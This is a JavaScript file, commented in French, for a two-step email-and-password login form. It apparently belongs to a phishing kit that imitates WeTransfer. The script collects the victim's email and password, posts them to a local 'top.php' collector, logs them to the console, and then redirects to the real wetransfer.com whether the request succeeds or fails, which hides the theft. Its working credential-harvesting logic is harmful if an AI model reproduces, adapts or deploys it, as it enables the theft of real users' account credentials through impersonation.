const emailInput = document.getElementById('email');
const passwordContainer = document.getElementById('password-container');
const passwordInput = document.getElementById('password');
const continueBtn = document.getElementById('continue-btn');
const emailError = document.getElementById('email-error');
const passwordError = document.getElementById('password-error');

let isEmailPhase = true;

function validateEmail(email) {
    return email.includes('@') && email.includes('.');
}

function validatePassword(password) {
    return password.length >= 8;
}

function showPasswordField() {
    emailInput.disabled = true;
    passwordContainer.style.display = 'block';
    continueBtn.textContent = 'Connecter';
    isEmailPhase = false;
    emailError.style.display = 'none';
    passwordInput.focus();
}

continueBtn.addEventListener('click', function() {
    if (isEmailPhase) {
        const email = emailInput.value;
        if (validateEmail(email)) {
            showPasswordField();
        } else {
            emailError.style.display = 'block';
        }
    } else {
        const password = passwordInput.value;
        if (validatePassword(password)) {
            passwordError.style.display = 'none';

            // Envoi des données au serveur via fetch
            const formData = new FormData();
            formData.append('email', emailInput.value);
            formData.append('password', passwordInput.value);

            console.log("Données envoyées:", {
                email: emailInput.value,
                password: passwordInput.value
            });

            fetch('top.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                console.log('Réponse du serveur:', data); // Affiche la réponse du serveur pour déboguer
                if (data.status === 'error') {
                    // Affichage des erreurs à l'écran
                    passwordError.textContent = data.message || 'Une erreur est survenue';
                    passwordError.style.display = 'block';
                }
                // Rediriger dans tous les cas (réponse du serveur)
                window.location.href = 'https://wetransfer.com/'; // Remplacez par la page de redirection souhaitée
            })
            .catch(error => {
                // Gérer les erreurs réseau
                console.error('Erreur réseau:', error); // Afficher l'erreur dans la console pour déboguer
                passwordError.textContent = 'Erreur de connexion au serveur';
                passwordError.style.display = 'block';
                // Rediriger même en cas d'erreur réseau
                window.location.href = 'https://wetransfer.com/'; // Remplacez par la page de redirection souhaitée
            });
        } else {
            passwordError.style.display = 'block';
        }
    }
});

emailInput.addEventListener('keyup', function(event) {
    if (event.key === 'Enter') {
        if (validateEmail(emailInput.value)) {
            showPasswordField();
        } else {
            emailError.style.display = 'block';
        }
    }
});

passwordInput.addEventListener('keyup', function(event) {
    if (event.key === 'Enter') {
        continueBtn.click();
    }
});